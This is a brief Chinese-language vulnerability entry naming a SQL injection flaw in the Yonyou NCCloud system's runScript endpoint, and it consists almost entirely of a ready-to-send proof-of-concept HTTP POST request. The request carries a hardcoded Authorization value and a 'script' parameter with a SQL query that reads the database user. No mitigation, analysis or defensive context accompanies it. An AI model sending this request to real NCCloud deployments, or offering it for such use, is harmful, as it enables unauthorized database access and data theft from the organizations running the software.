## 用友NCCloud系统runScript存在SQL注入漏洞


## poc
```
POST /ncchr/attendScript/internal/runScript HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
Content-Length: 59
Accept: */*
Accept-Encoding: gzip
Accept-Language: en
Authorization: 58e00466213416018d01d15de83b0198
Connection: close
Content-Type: application/x-www-form-urlencoded

key=1&script=select 1,111*111,USER,4,5,6,7,8,9,10 from dual
```
